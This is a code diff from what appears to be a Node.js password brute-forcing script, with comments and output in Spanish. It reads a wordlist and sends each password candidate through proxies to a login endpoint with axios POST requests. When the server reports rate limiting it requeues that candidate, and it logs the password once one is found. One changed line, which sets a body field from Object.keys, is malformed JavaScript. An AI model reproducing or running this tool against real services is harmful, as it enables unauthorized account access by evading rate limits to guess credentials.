@@ -62,7 +62,7 @@ let wordlist= fs.readFileSync(yarg.wordlist).toString().split("\n")
 
 
 
-let body= yarg.body
+let body=JSON.parse(yarg.body)
 
 
 
@@ -102,11 +102,11 @@ async function worker(proxie){let i=0;
 
     
 
-    while(i<yarg.n){try{let contraseña= wordlist.shift();
+    while(i<yarg.n){try{let contraseña= wordlist.shift(); body.Object.keys(body)[1]= contraseña
 
        
 
-            axios.post(url,JSON.parse(body),{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})
+            axios.post(url,body,{httpAgent:proxie,httpsAgent:proxie,headers:{"Content-Type":header}})
 
      .then(function(data){if(data.data.includes("to many")){wordlist.unshift(contraseña)}if(!data.data.includes("to many")){++num_de_peticiones; console.log(num_de_peticiones);console.log("contraseña incorrecta:",contraseña);}; if(!data.data.includes("error")){console.log("la contraseña es:",contraseña); contraseña_encontrada=true; return}}).catch(function(error){console.log("error",error)})
 
